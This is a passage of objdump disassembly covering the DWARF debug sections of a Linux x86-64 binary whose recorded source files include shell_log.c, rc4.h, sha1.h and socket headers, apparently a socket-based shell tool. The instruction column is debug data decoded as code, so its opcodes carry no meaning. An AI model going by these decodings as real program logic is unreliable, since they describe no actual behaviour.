 2f9:	0b 0b                	or     (%rbx),%ecx
 2fb:	3e 0b 03             	or     %ds:(%rbx),%eax
 2fe:	08 00                	or     %al,(%rax)
 300:	00 04 13             	add    %al,(%rbx,%rdx,1)
 303:	01 0b                	add    %ecx,(%rbx)
 305:	0b 3a                	or     (%rdx),%edi
 307:	0b 3b                	or     (%rbx),%edi
 309:	0b 01                	or     (%rcx),%eax
 30b:	13 00                	adc    (%rax),%eax
 30d:	00 05 0d 00 03 0e    	add    %al,0xe03000d(%rip)        # e030320 <_end+0xda27130>
 313:	3a 0b                	cmp    (%rbx),%cl
 315:	3b 0b                	cmp    (%rbx),%ecx
 317:	49 13 38             	adc    (%r8),%rdi
 31a:	0b 00                	or     (%rax),%eax
 31c:	00 06                	add    %al,(%rsi)
 31e:	01 01                	add    %eax,(%rcx)
 320:	49 13 01             	adc    (%r9),%rax
 323:	13 00                	adc    (%rax),%eax
 325:	00 07                	add    %al,(%rdi)
 327:	21 00                	and    %eax,(%rax)
 329:	49 13 2f             	adc    (%r15),%rbp
 32c:	0b 00                	or     (%rax),%eax
 32e:	00 08                	add    %cl,(%rax)
 330:	16                   	(bad)  
 331:	00 03                	add    %al,(%rbx)
 333:	0e                   	(bad)  
 334:	3a 0b                	cmp    (%rbx),%cl
 336:	3b 0b                	cmp    (%rbx),%ecx
 338:	49 13 00             	adc    (%r8),%rax
 33b:	00 09                	add    %cl,(%rcx)
 33d:	2e 01 3f             	add    %edi,%cs:(%rdi)
 340:	19 03                	sbb    %eax,(%rbx)
 342:	0e                   	(bad)  
 343:	3a 0b                	cmp    (%rbx),%cl
 345:	3b 0b                	cmp    (%rbx),%ecx
 347:	27                   	(bad)  
 348:	19 11                	sbb    %edx,(%rcx)
 34a:	01 12                	add    %edx,(%rdx)
 34c:	07                   	(bad)  
 34d:	40 18 97 42 19 01 13 	sbb    %dl,0x13011942(%rdi)
 354:	00 00                	add    %al,(%rax)
 356:	0a 05 00 03 08 3a    	or     0x3a080300(%rip),%al        # 3a08065c <_end+0x39a7746c>
 35c:	0b 3b                	or     (%rbx),%edi
 35e:	0b 49 13             	or     0x13(%rcx),%ecx
 361:	02 18                	add    (%rax),%bl
 363:	00 00                	add    %al,(%rax)
 365:	0b 0f                	or     (%rdi),%ecx
 367:	00 0b                	add    %cl,(%rbx)
 369:	0b 49 13             	or     0x13(%rcx),%ecx
 36c:	00 00                	add    %al,(%rax)
 36e:	0c 05                	or     $0x5,%al
 370:	00 03                	add    %al,(%rbx)
 372:	0e                   	(bad)  
 373:	3a 0b                	cmp    (%rbx),%cl
 375:	3b 0b                	cmp    (%rbx),%ecx
 377:	49 13 02             	adc    (%r10),%rax
 37a:	18 00                	sbb    %al,(%rax)
 37c:	00 0d 34 00 03 0e    	add    %cl,0xe030034(%rip)        # e0303b6 <_end+0xda271c6>
 382:	3a 0b                	cmp    (%rbx),%cl
 384:	3b 0b                	cmp    (%rbx),%ecx
 386:	49 13 02             	adc    (%r10),%rax
 389:	18 00                	sbb    %al,(%rax)
 38b:	00 0e                	add    %cl,(%rsi)
 38d:	34 00                	xor    $0x0,%al
 38f:	03 08                	add    (%rax),%ecx
 391:	3a 0b                	cmp    (%rbx),%cl
 393:	3b 0b                	cmp    (%rbx),%ecx
 395:	49 13 02             	adc    (%r10),%rax
 398:	18 00                	sbb    %al,(%rax)
 39a:	00 0f                	add    %cl,(%rdi)
 39c:	2e 01 3f             	add    %edi,%cs:(%rdi)
 39f:	19 03                	sbb    %eax,(%rbx)
 3a1:	0e                   	(bad)  
 3a2:	3a 0b                	cmp    (%rbx),%cl
 3a4:	3b 0b                	cmp    (%rbx),%ecx
 3a6:	27                   	(bad)  
 3a7:	19 11                	sbb    %edx,(%rcx)
 3a9:	01 12                	add    %edx,(%rdx)
 3ab:	07                   	(bad)  
 3ac:	40 18 96 42 19 01 13 	sbb    %dl,0x13011942(%rsi)
 3b3:	00 00                	add    %al,(%rax)
 3b5:	00 01                	add    %al,(%rcx)
 3b7:	11 01                	adc    %eax,(%rcx)
 3b9:	25 0e 13 0b 03       	and    $0x30b130e,%eax
 3be:	0e                   	(bad)  
 3bf:	1b 0e                	sbb    (%rsi),%ecx
 3c1:	11 01                	adc    %eax,(%rcx)
 3c3:	12 07                	adc    (%rdi),%al
 3c5:	10 17                	adc    %dl,(%rdi)
 3c7:	00 00                	add    %al,(%rax)
 3c9:	02 13                	add    (%rbx),%dl
 3cb:	01 03                	add    %eax,(%rbx)
 3cd:	0e                   	(bad)  
 3ce:	0b 05 3a 0b 3b 0b    	or     0xb3b0b3a(%rip),%eax        # b3b0f0e <_end+0xada7d1e>
 3d4:	01 13                	add    %edx,(%rbx)
 3d6:	00 00                	add    %al,(%rax)
 3d8:	03 0d 00 03 08 3a    	add    0x3a080300(%rip),%ecx        # 3a0806de <_end+0x39a774ee>
 3de:	0b 3b                	or     (%rbx),%edi
 3e0:	0b 49 13             	or     0x13(%rcx),%ecx
 3e3:	38 0b                	cmp    %cl,(%rbx)
 3e5:	00 00                	add    %al,(%rax)
 3e7:	04 24                	add    $0x24,%al
 3e9:	00 0b                	add    %cl,(%rbx)
 3eb:	0b 3e                	or     (%rsi),%edi
 3ed:	0b 03                	or     (%rbx),%eax
 3ef:	08 00                	or     %al,(%rax)
 3f1:	00 05 01 01 49 13    	add    %al,0x13490101(%rip)        # 134904f8 <_end+0x12e87308>
 3f7:	01 13                	add    %edx,(%rbx)
 3f9:	00 00                	add    %al,(%rax)
 3fb:	06                   	(bad)  
 3fc:	21 00                	and    %eax,(%rax)
 3fe:	49 13 2f             	adc    (%r15),%rbp
 401:	0b 00                	or     (%rax),%eax
 403:	00 07                	add    %al,(%rdi)
 405:	24 00                	and    $0x0,%al
 407:	0b 0b                	or     (%rbx),%ecx
 409:	3e 0b 03             	or     %ds:(%rbx),%eax
 40c:	0e                   	(bad)  
 40d:	00 00                	add    %al,(%rax)
 40f:	08 2e                	or     %ch,(%rsi)
 411:	01 3f                	add    %edi,(%rdi)
 413:	19 03                	sbb    %eax,(%rbx)
 415:	0e                   	(bad)  
 416:	3a 0b                	cmp    (%rbx),%cl
 418:	3b 0b                	cmp    (%rbx),%ecx
 41a:	27                   	(bad)  
 41b:	19 11                	sbb    %edx,(%rcx)
 41d:	01 12                	add    %edx,(%rdx)
 41f:	07                   	(bad)  
 420:	40 18 97 42 19 01 13 	sbb    %dl,0x13011942(%rdi)
 427:	00 00                	add    %al,(%rax)
 429:	09 05 00 03 08 3a    	or     %eax,0x3a080300(%rip)        # 3a08072f <_end+0x39a7753f>
 42f:	0b 3b                	or     (%rbx),%edi
 431:	0b 49 13             	or     0x13(%rcx),%ecx
 434:	02 18                	add    (%rax),%bl
 436:	00 00                	add    %al,(%rax)
 438:	0a 05 00 03 0e 3a    	or     0x3a0e0300(%rip),%al        # 3a0e073e <_end+0x39ad754e>
 43e:	0b 3b                	or     (%rbx),%edi
 440:	0b 49 13             	or     0x13(%rcx),%ecx
 443:	02 18                	add    (%rax),%bl
 445:	00 00                	add    %al,(%rax)
 447:	0b 34 00             	or     (%rax,%rax,1),%esi
 44a:	03 08                	add    (%rax),%ecx
 44c:	3a 0b                	cmp    (%rbx),%cl
 44e:	3b 0b                	cmp    (%rbx),%ecx
 450:	49 13 02             	adc    (%r10),%rax
 453:	18 00                	sbb    %al,(%rax)
 455:	00 0c 0f             	add    %cl,(%rdi,%rcx,1)
 458:	00 0b                	add    %cl,(%rbx)
 45a:	0b 49 13             	or     0x13(%rcx),%ecx
 45d:	00 00                	add    %al,(%rax)
 45f:	0d 2e 01 3f 19       	or     $0x193f012e,%eax
 464:	03 0e                	add    (%rsi),%ecx
 466:	3a 0b                	cmp    (%rbx),%cl
 468:	3b 0b                	cmp    (%rbx),%ecx
 46a:	27                   	(bad)  
 46b:	19 11                	sbb    %edx,(%rcx)
 46d:	01 12                	add    %edx,(%rdx)
 46f:	07                   	(bad)  
 470:	40 18 97 42 19 00 00 	sbb    %dl,0x1942(%rdi)
	...

Disassembly of section .debug_line:

0000000000000000 <.debug_line>:
   0:	67 03 00             	add    (%eax),%eax
   3:	00 02                	add    %al,(%rdx)
   5:	00 29                	add    %ch,(%rcx)
   7:	01 00                	add    %eax,(%rax)
   9:	00 01                	add    %al,(%rcx)
   b:	01 fb                	add    %edi,%ebx
   d:	0e                   	(bad)  
   e:	0d 00 01 01 01       	or     $0x1010100,%eax
  13:	01 00                	add    %eax,(%rax)
  15:	00 00                	add    %al,(%rax)
  17:	01 00                	add    %eax,(%rax)
  19:	00 01                	add    %al,(%rcx)
  1b:	2f                   	(bad)  
  1c:	75 73                	jne    91 <_init-0x400d07>
  1e:	72 2f                	jb     4f <_init-0x400d49>
  20:	69 6e 63 6c 75 64 65 	imul   $0x6564756c,0x63(%rsi),%ebp
  27:	2f                   	(bad)  
  28:	78 38                	js     62 <_init-0x400d36>
  2a:	36                   	ss
  2b:	5f                   	pop    %rdi
  2c:	36                   	ss
  2d:	34 2d                	xor    $0x2d,%al
  2f:	6c                   	insb   (%dx),%es:(%rdi)
  30:	69 6e 75 78 2d 67 6e 	imul   $0x6e672d78,0x75(%rsi),%ebp
  37:	75 2f                	jne    68 <_init-0x400d30>
  39:	62                   	(bad)  
  3a:	69 74 73 00 2f 75 73 	imul   $0x7273752f,0x0(%rbx,%rsi,2),%esi
  41:	72 
  42:	2f                   	(bad)  
  43:	69 6e 63 6c 75 64 65 	imul   $0x6564756c,0x63(%rsi),%ebp
  4a:	2f                   	(bad)  
  4b:	78 38                	js     85 <_init-0x400d13>
  4d:	36                   	ss
  4e:	5f                   	pop    %rdi
  4f:	36                   	ss
  50:	34 2d                	xor    $0x2d,%al
  52:	6c                   	insb   (%dx),%es:(%rdi)
  53:	69 6e 75 78 2d 67 6e 	imul   $0x6e672d78,0x75(%rsi),%ebp
  5a:	75 2f                	jne    8b <_init-0x400d0d>
  5c:	73 79                	jae    d7 <_init-0x400cc1>
  5e:	73 00                	jae    60 <_init-0x400d38>
  60:	2f                   	(bad)  
  61:	75 73                	jne    d6 <_init-0x400cc2>
  63:	72 2f                	jb     94 <_init-0x400d04>
  65:	69 6e 63 6c 75 64 65 	imul   $0x6564756c,0x63(%rsi),%ebp
  6c:	00 2f                	add    %ch,(%rdi)
  6e:	75 73                	jne    e3 <_init-0x400cb5>
  70:	72 2f                	jb     a1 <_init-0x400cf7>
  72:	69 6e 63 6c 75 64 65 	imul   $0x6564756c,0x63(%rsi),%ebp
  79:	2f                   	(bad)  
  7a:	6e                   	outsb  %ds:(%rsi),(%dx)
  7b:	65                   	gs
  7c:	74 69                	je     e7 <_init-0x400cb1>
  7e:	6e                   	outsb  %ds:(%rsi),(%dx)
  7f:	65                   	gs
  80:	74 00                	je     82 <_init-0x400d16>
  82:	00 73 68             	add    %dh,0x68(%rbx)
  85:	65                   	gs
  86:	6c                   	insb   (%dx),%es:(%rdi)
  87:	6c                   	insb   (%dx),%es:(%rdi)
  88:	5f                   	pop    %rdi
  89:	6c                   	insb   (%dx),%es:(%rdi)
  8a:	6f                   	outsl  %ds:(%rsi),(%dx)
  8b:	67 2e 63 00          	movslq %cs:(%eax),%eax
  8f:	00 00                	add    %al,(%rax)
  91:	00 74 79 70          	add    %dh,0x70(%rcx,%rdi,2)
  95:	65                   	gs
  96:	73 2e                	jae    c6 <_init-0x400cd2>
  98:	68 00 01 00 00       	pushq  $0x100
  9d:	74 69                	je     108 <_init-0x400c90>
  9f:	6d                   	insl   (%dx),%es:(%rdi)
  a0:	65                   	gs
  a1:	2e                   	cs
  a2:	68 00 01 00 00       	pushq  $0x100
  a7:	73 65                	jae    10e <_init-0x400c8a>
  a9:	6c                   	insb   (%dx),%es:(%rdi)
  aa:	65 63 74 2e 68       	movslq %gs:0x68(%rsi,%rbp,1),%esi
  af:	00 02                	add    %al,(%rdx)
  b1:	00 00                	add    %al,(%rax)
  b3:	73 6f                	jae    124 <_init-0x400c74>
  b5:	63 6b 61             	movslq 0x61(%rbx),%ebp
  b8:	64                   	fs
  b9:	64                   	fs
  ba:	72 2e                	jb     ea <_init-0x400cae>
  bc:	68 00 01 00 00       	pushq  $0x100
  c1:	73 6f                	jae    132 <_init-0x400c66>
  c3:	63 6b 65             	movslq 0x65(%rbx),%ebp
  c6:	74 2e                	je     f6 <_init-0x400ca2>
  c8:	68 00 01 00 00       	pushq  $0x100
  cd:	73 74                	jae    143 <_init-0x400c55>
  cf:	64 69 6e 74 2e 68 00 	imul   $0x300682e,%fs:0x74(%rsi),%ebp
  d6:	03 
  d7:	00 00                	add    %al,(%rax)
  d9:	69 6e 2e 68 00 04 00 	imul   $0x40068,0x2e(%rsi),%ebp
  e0:	00 69 6f             	add    %ch,0x6f(%rcx)
  e3:	63 74 6c 2d          	movslq 0x2d(%rsp,%rbp,2),%esi
  e7:	74 79                	je     162 <_init-0x400c36>
  e9:	70 65                	jo     150 <_init-0x400c48>
  eb:	73 2e                	jae    11b <_init-0x400c7d>
  ed:	68 00 01 00 00       	pushq  $0x100
  f2:	74 65                	je     159 <_init-0x400c3f>
  f4:	72 6d                	jb     163 <_init-0x400c35>
  f6:	69 6f 73 2e 68 00 01 	imul   $0x100682e,0x73(%rdi),%ebp
  fd:	00 00                	add    %al,(%rax)
  ff:	72 63                	jb     164 <_init-0x400c34>
 101:	34 2e                	xor    $0x2e,%al
 103:	68 00 00 00 00       	pushq  $0x0
 108:	73 68                	jae    172 <_init-0x400c26>
 10a:	61                   	(bad)  
 10b:	31 2e                	xor    %ebp,(%rsi)
 10d:	68 00 00 00 00       	pushq  $0x0
 112:	73 68                	jae    17c <_init-0x400c1c>
 114:	65                   	gs
 115:	6c                   	insb   (%dx),%es:(%rdi)
 116:	6c                   	insb   (%dx),%es:(%rdi)
 117:	5f                   	pop    %rdi
 118:	6c                   	insb   (%dx),%es:(%rdi)
 119:	6f                   	outsl  %ds:(%rsi),(%dx)
 11a:	67                   	addr32
 11b:	2e                   	cs
 11c:	68 00 00 00 00       	pushq  $0x0
 121:	73 6f                	jae    192 <_init-0x400c06>
 123:	63 6b 65             	movslq 0x65(%rbx),%ebp
 126:	74 5f                	je     187 <_init-0x400c11>
 128:	74 79                	je     1a3 <_init-0x400bf5>
 12a:	70 65                	jo     191 <_init-0x400c07>
 12c:	2e                   	cs
 12d:	68 00 01 00 00       	pushq  $0x100
 132:	00 00                	add    %al,(%rax)
 134:	09 02                	or     %eax,(%rdx)
 136:	5d                   	pop    %rbp
 137:	11 40 00             	adc    %eax,0x0(%rax)
 13a:	00 00                	add    %al,(%rax)
 13c:	00 00                	add    %al,(%rax)
 13e:	03 2e                	add    (%rsi),%ebp
 140:	01 ad 67 9f e6 67    	add    %ebp,0x67e69f67(%rbp)
 146:	a0 30 f2 e6 76 08 75 	movabs 0x267750876e6f230,%al
 14d:	67 02 
 14f:	53                   	push   %rbx
 150:	13 77 08             	adc    0x8(%rdi),%esi
 153:	ae                   	scas   %es:(%rdi),%al
 154:	08 68 91             	or     %ch,-0x6f(%rax)
 157:	ad                   	lods   %ds:(%rsi),%eax
 158:	ad                   	lods   %ds:(%rsi),%eax
 159:	92                   	xchg   %eax,%edx
 15a:	4b                   	rex.WXB
 15b:	4c 08 5a 59          	rex.WR or %r11b,0x59(%rdx)
 15f:	08 a0 bb 08 91 30    	or     %ah,0x309108bb(%rax)
 165:	ba e6 02 24 13       	mov    $0x132402e6,%edx
 16a:	02 53 13             	add    0x13(%rbx),%dl
 16d:	77 9f                	ja     10e <_init-0x400c8a>
 16f:	08 21                	or     %ah,(%rcx)
 171:	08 4b ae             	or     %cl,-0x52(%rbx)
 174:	59                   	pop    %rcx
 175:	08 5b 08             	or     %bl,0x8(%rbx)
 178:	66                   	data16
 179:	e6 75                	out    %al,$0x75
 17b:	75 08                	jne    185 <_init-0x400c13>
 17d:	ad                   	lods   %ds:(%rsi),%eax
 17e:	76 e5                	jbe    165 <_init-0x400c33>
 180:	5a                   	pop    %rdx
 181:	02 22                	add    (%rdx),%ah
 183:	13 68 08             	adc    0x8(%rax),%ebp
 186:	67 08 5b e6          	or     %bl,-0x1a(%ebx)
 18a:	e5 30                	in     $0x30,%eax
 18c:	02 22                	add    (%rdx),%ah
 18e:	13 68 75             	adc    0x75(%rax),%ebp
 191:	e5 2f                	in     $0x2f,%eax
 193:	08 5a 76             	or     %bl,0x76(%rdx)
 196:	02 57 14             	add    0x14(%rdi),%dl
 199:	59                   	pop    %rcx
 19a:	08 a0 08 90 ea 9f    	or     %ah,-0x60156ff8(%rax)
 1a0:	a0 e5 02 23 16 00 02 	movabs 0x2040200162302e5,%al
 1a7:	04 02 
 1a9:	bb 00 02 04 02       	mov    $0x2040200,%ebx
 1ae:	08 e3                	or     %ah,%bl
 1b0:	00 02                	add    %al,(%rdx)
 1b2:	04 01                	add    $0x1,%al
 1b4:	06                   	(bad)  
 1b5:	74 06                	je     1bd <_init-0x400bdb>
 1b7:	95                   	xchg   %eax,%ebp
 1b8:	02 2e                	add    (%rsi),%ch
 1ba:	13 02                	adc    (%rdx),%eax
 1bc:	32 13                	xor    (%rbx),%dl
 1be:	02 32                	add    (%rdx),%dh
 1c0:	13 02                	adc    (%rdx),%eax
 1c2:	32 14 02             	xor    (%rdx,%rax,1),%dl
 1c5:	2f                   	(bad)  
 1c6:	13 02                	adc    (%rdx),%eax
 1c8:	33 13                	xor    (%rbx),%edx
 1ca:	02 33                	add    (%rbx),%dh
 1cc:	13 02                	adc    (%rdx),%eax
 1ce:	33 14 02             	xor    (%rdx,%rax,1),%edx
 1d1:	2e 13 02             	adc    %cs:(%rdx),%eax
 1d4:	31 13                	xor    %edx,(%rbx)
 1d6:	02 2e                	add    (%rsi),%ch
 1d8:	13 02                	adc    (%rdx),%eax
 1da:	31 14 02             	xor    %edx,(%rdx,%rax,1)
 1dd:	2e                   	cs
 1de:	14 02                	adc    $0x2,%al
 1e0:	49 13 bc e5 02 2d 13 	adc    0x2132d02(%r13,%riz,8),%rdi
 1e7:	02 
 1e8:	2c 16                	sub    $0x16,%al
 1ea:	02 22                	add    (%rdx),%ah
 1ec:	13 02                	adc    (%rdx),%eax
 1ee:	2d 14 e5 08 c9       	sub    $0xc908e514,%eax
 1f3:	08 86 08 c9 02 2d    	or     %al,0x2d02c908(%rsi)
 1f9:	16                   	(bad)  
 1fa:	ab                   	stos   %eax,%es:(%rdi)
 1fb:	02 39                	add    (%rcx),%bh
 1fd:	19 08                	sbb    %ecx,(%rax)
 1ff:	69 9f 08 9f 08 ad 08 	imul   $0x9f089f08,-0x52f760f8(%rdi),%ebx
 206:	9f 08 9f 
 209:	08 9f 08 9f 9f 08    	or     %bl,0x89f9f08(%rdi)
 20f:	bb 9f 08 bd 02       	mov    $0x2bd089f,%ebx
 214:	22 13                	and    (%rbx),%dl
 216:	02 2d 14 e5 08 c9    	add    -0x36f71aec(%rip),%ch        # ffffffffc908e730 <_end+0xffffffffc8a85540>
 21c:	08 84 08 c9 02 2d 14 	or     %al,0x142d02c9(%rax,%rcx,1)
 223:	e5 02                	in     $0x2,%eax
 225:	2d 13 08 84 02       	sub    $0x2840813,%eax
 22a:	3a 13                	cmp    (%rbx),%dl
 22c:	02 4b 15             	add    0x15(%rbx),%cl
 22f:	a0 02 24 13 02 27 11 	movabs 0x230112702132402,%al
 236:	30 02 
 238:	27                   	(bad)  
 239:	11 30                	adc    %esi,(%rax)
 23b:	02 27                	add    (%rdi),%ah
 23d:	11 2c 95 02 24 13 02 	adc    %ebp,0x2132402(,%rdx,4)
 244:	27                   	(bad)  
 245:	11 30                	adc    %esi,(%rax)
 247:	02 27                	add    (%rdi),%ah
 249:	11 30                	adc    %esi,(%rax)
 24b:	02 27                	add    (%rdi),%ah
 24d:	11 2c 95 02 53 13 02 	adc    %ebp,0x2135302(,%rdx,4)
 254:	53                   	push   %rbx
 255:	13 02                	adc    (%rdx),%eax
 257:	2a 14 08             	sub    (%rax,%rcx,1),%dl
 25a:	ad                   	lods   %ds:(%rsi),%eax
 25b:	08 91 02 39 13 08    	or     %dl,0x8133902(%rcx)
 261:	5a                   	pop    %rdx
 262:	9f                   	lahf   
 263:	08 75 08             	or     %dh,0x8(%rbp)
 266:	75 08                	jne    270 <_init-0x400b28>
 268:	67 08 67 08          	or     %ah,0x8(%edi)
 26c:	67 08 67 9f          	or     %ah,-0x61(%edi)
 270:	08 be 03 85 7f 08    	or     %bh,0x87f8503(%rsi)
 276:	66                   	data16
 277:	00 02                	add    %al,(%rdx)
 279:	04 01                	add    $0x1,%al
 27b:	06                   	(bad)  
 27c:	9e                   	sahf   
 27d:	06                   	(bad)  
 27e:	03 fe                	add    %esi,%edi
 280:	00 08                	add    %cl,(%rax)
 282:	58                   	pop    %rax
 283:	08 ca                	or     %cl,%dl
 285:	08 74 e7 9f          	or     %dh,-0x61(%rdi,%riz,8)
 289:	a3 02 22 16 02 26 13 	movabs %eax,0x291132602162202
 290:	91 02 
 292:	4b 13 5b 02          	rex.WXB adc 0x2(%r11),%rbx
 296:	5a                   	pop    %rdx
 297:	14 00                	adc    $0x0,%al
 299:	02 04 01             	add    (%rcx,%rax,1),%al
 29c:	d7                   	xlat   %ds:(%rbx)
 29d:	00 02                	add    %al,(%rdx)
 29f:	04 01                	add    $0x1,%al
 2a1:	9d                   	popfq  
 2a2:	4c 9d                	rex.WR popfq 
 2a4:	4c 57                	rex.WR push %rdi
 2a6:	5b                   	pop    %rbx
 2a7:	02 4b 13             	add    0x13(%rbx),%cl
 2aa:	5b                   	pop    %rbx
 2ab:	08 4b 91             	or     %cl,-0x6f(%rbx)
 2ae:	02 4b 13             	add    0x13(%rbx),%cl
 2b1:	5d                   	pop    %rbp
 2b2:	02 2a                	add    (%rdx),%ch
 2b4:	13 02                	adc    (%rdx),%eax
 2b6:	59                   	pop    %rcx
 2b7:	13 5b 08             	adc    0x8(%rbx),%ebx
 2ba:	c9                   	leaveq 
 2bb:	02 59 13             	add    0x13(%rcx),%bl
 2be:	5a                   	pop    %rdx
 2bf:	02 5a 14             	add    0x14(%rdx),%bl
 2c2:	08 bb 91 02 4b 13    	or     %bh,0x134b0291(%rbx)
 2c8:	5d                   	pop    %rbp
 2c9:	02 22                	add    (%rdx),%ah
 2cb:	13 02                	adc    (%rdx),%eax
 2cd:	22 16                	and    (%rsi),%dl
 2cf:	e5 e8                	in     $0xe8,%eax
 2d1:	08 d8                	or     %bl,%al
 2d3:	e5 02                	in     $0x2,%eax
 2d5:	59                   	pop    %rcx
 2d6:	13 60 ad             	adc    -0x53(%rax),%esp
 2d9:	91                   	xchg   %eax,%ecx
 2da:	02 59 16             	add    0x16(%rcx),%bl
 2dd:	08 b0 9f 9f 08 22    	or     %dh,0x22089f9f(%rax)
 2e3:	ad                   	lods   %ds:(%rsi),%eax
 2e4:	9f                   	lahf   
 2e5:	08 22                	or     %ah,(%rdx)
 2e7:	ad                   	lods   %ds:(%rsi),%eax
 2e8:	9f                   	lahf   
 2e9:	08 23                	or     %ah,(%rbx)
 2eb:	00 02                	add    %al,(%rdx)
 2ed:	04 01                	add    $0x1,%al
 2ef:	06                   	(bad)  
 2f0:	ac                   	lods   %ds:(%rsi),%al
 2f1:	06                   	(bad)  
 2f2:	c9                   	leaveq 
 2f3:	00 02                	add    %al,(%rdx)
 2f5:	04 01                	add    $0x1,%al
 2f7:	06                   	(bad)  
 2f8:	ac                   	lods   %ds:(%rsi),%al
 2f9:	06                   	(bad)  
 2fa:	ca ca 9f             	lret   $0x9fca
 2fd:	08 83 08 bb a6 08    	or     %al,0x8a6bb08(%rbx)
 303:	13 b0 02 2b 13 02    	adc    0x2132b02(%rax),%esi
 309:	4b 13 08             	rex.WXB adc (%r8),%rcx
 30c:	22 08                	and    (%rax),%cl
 30e:	5a                   	pop    %rdx
 30f:	02 37                	add    (%rdi),%dh
 311:	13 00                	adc    (%rax),%eax
 313:	02 04 01             	add    (%rcx,%rax,1),%al
 316:	06                   	(bad)  
 317:	90                   	nop
 318:	06                   	(bad)  
 319:	08 e6                	or     %ah,%dh
 31b:	5b                   	pop    %rbx
 31c:	08 30                	or     %dh,(%rax)
 31e:	08 40 02             	or     %al,0x2(%rax)
 321:	2c 13                	sub    $0x13,%al
 323:	00 02                	add    %al,(%rdx)
 325:	04 01                	add    $0x1,%al
 327:	06                   	(bad)  
 328:	90                   	nop
 329:	06                   	(bad)  
 32a:	08 e7                	or     %ah,%bh
 32c:	5b                   	pop    %rbx
 32d:	9f                   	lahf   
 32e:	bb 08 84 02 2a       	mov    $0x2a028408,%ebx
 333:	1a 02                	sbb    (%rdx),%al
 335:	40 14 08             	adc    $0x8,%al
 338:	40 02 2f             	add    (%rdi),%bpl
 33b:	13 00                	adc    (%rax),%eax
 33d:	02 04 01             	add    (%rcx,%rax,1),%al
 340:	06                   	(bad)  
 341:	90                   	nop
 342:	06                   	(bad)  
 343:	08 77 5b             	or     %dh,0x5b(%rdi)
 346:	9f                   	lahf   
 347:	bb 08 84 03 09       	mov    $0x9038408,%ebx
 34c:	02 29                	add    (%rcx),%ch
 34e:	01 ad 9f 31 b0 9f    	add    %ebp,-0x604fce61(%rbp)
 354:	02 22                	add    (%rdx),%ah
 356:	13 02                	adc    (%rdx),%eax
 358:	22 13                	and    (%rbx),%dl
 35a:	08 23                	or     %ah,(%rbx)
 35c:	a0 25 9f ca 9f ca 9f 	movabs 0x8ca9fca9fca9f25,%al
 363:	ca 08 
 365:	83 02 0a             	addl   $0xa,(%rdx)
 368:	00 01                	add    %al,(%rcx)
 36a:	01 6a 01             	add    %ebp,0x1(%rdx)
 36d:	00 00                	add    %al,(%rax)
 36f:	02 00                	add    (%rax),%al
 371:	d2 00                	rolb   %cl,(%rax)
 373:	00 00                	add    %al,(%rax)
 375:	01 01                	add    %eax,(%rcx)
 377:	fb                   	sti    
 378:	0e                   	(bad)  
 379:	0d 00 01 01 01       	or     $0x1010100,%eax
 37e:	01 00                	add    %eax,(%rax)
 380:	00 00                	add    %al,(%rax)
 382:	01 00                	add    %eax,(%rax)
 384:	00 01                	add    %al,(%rcx)
 386:	2f                   	(bad)  
 387:	75 73                	jne    3fc <_init-0x40099c>
 389:	72 2f                	jb     3ba <_init-0x4009de>
 38b:	6c                   	insb   (%dx),%es:(%rdi)
 38c:	69 62 2f 67 63 63 2f 	imul   $0x2f636367,0x2f(%rdx),%esp
 393:	78 38                	js     3cd <_init-0x4009cb>
 395:	36                   	ss
 396:	5f                   	pop    %rdi
 397:	36                   	ss
 398:	34 2d                	xor    $0x2d,%al
 39a:	6c                   	insb   (%dx),%es:(%rdi)
 39b:	69 6e 75 78 2d 67 6e 	imul   $0x6e672d78,0x75(%rsi),%ebp
 3a2:	75 2f                	jne    3d3 <_init-0x4009c5>
 3a4:	34 2e                	xor    $0x2e,%al
 3a6:	38 2f                	cmp    %ch,(%rdi)
 3a8:	69 6e 63 6c 75 64 65 	imul   $0x6564756c,0x63(%rsi),%ebp
 3af:	00 2f                	add    %ch,(%rdi)
 3b1:	75 73                	jne    426 <_init-0x400972>
 3b3:	72 2f                	jb     3e4 <_init-0x4009b4>
 3b5:	69 6e 63 6c 75 64 65 	imul   $0x6564756c,0x63(%rsi),%ebp
 3bc:	2f                   	(bad)  
 3bd:	78 38                	js     3f7 <_init-0x4009a1>
 3bf:	36                   	ss
 3c0:	5f                   	pop    %rdi
 3c1:	36                   	ss
 3c2:	34 2d                	xor    $0x2d,%al
 3c4:	6c                   	insb   (%dx),%es:(%rdi)
 3c5:	69 6e 75 78 2d 67 6e 	imul   $0x6e672d78,0x75(%rsi),%ebp
 3cc:	75 2f                	jne    3fd <_init-0x40099b>
 3ce:	62                   	(bad)  
 3cf:	69 74 73 00 2f 75 73 	imul   $0x7273752f,0x0(%rbx,%rsi,2),%esi
 3d6:	72 
 3d7:	2f                   	(bad)  
 3d8:	69 6e 63 6c 75 64 65 	imul   $0x6564756c,0x63(%rsi),%ebp
 3df:	2f                   	(bad)  
 3e0:	78 38                	js     41a <_init-0x40097e>
 3e2:	36                   	ss
 3e3:	5f                   	pop    %rdi
 3e4:	36                   	ss
 3e5:	34 2d                	xor    $0x2d,%al
 3e7:	6c                   	insb   (%dx),%es:(%rdi)
 3e8:	69 6e 75 78 2d 67 6e 	imul   $0x6e672d78,0x75(%rsi),%ebp
 3ef:	75 2f                	jne    420 <_init-0x400978>
 3f1:	73 79                	jae    46c <_init-0x40092c>
 3f3:	73 00                	jae    3f5 <_init-0x4009a3>
 3f5:	2f                   	(bad)  
 3f6:	75 73                	jne    46b <_init-0x40092d>
 3f8:	72 2f                	jb     429 <_init-0x40096f>
 3fa:	69 6e 63 6c 75 64 65 	imul   $0x6564756c,0x63(%rsi),%ebp
 401:	00 00                	add    %al,(%rax)
 403:	75 74                	jne    479 <_init-0x40091f>
 405:	69 6c 73 2e 63 00 00 	imul   $0x63,0x2e(%rbx,%rsi,2),%ebp
 40c:	00 
 40d:	00 73 74             	add    %dh,0x74(%rbx)
 410:	64                   	fs
 411:	64                   	fs
 412:	65                   	gs
 413:	66                   	data16
 414:	2e                   	cs
 415:	68 00 01 00 00       	pushq  $0x100
 41a:	74 79                	je     495 <_init-0x400903>
 41c:	70 65                	jo     483 <_init-0x400915>
 41e:	73 2e                	jae    44e <_init-0x40094a>
 420:	68 00 02 00 00       	pushq  $0x200
 425:	74 79                	je     4a0 <_init-0x4008f8>
 427:	70 65                	jo     48e <_init-0x40090a>
 429:	73 2e                	jae    459 <_init-0x40093f>
 42b:	68 00 03 00 00       	pushq  $0x300
 430:	74 69                	je     49b <_init-0x4008fd>
 432:	6d                   	insl   (%dx),%es:(%rdi)
 433:	65                   	gs
 434:	2e                   	cs
 435:	68 00 04 00 00       	pushq  $0x400
 43a:	73 74                	jae    4b0 <_init-0x4008e8>
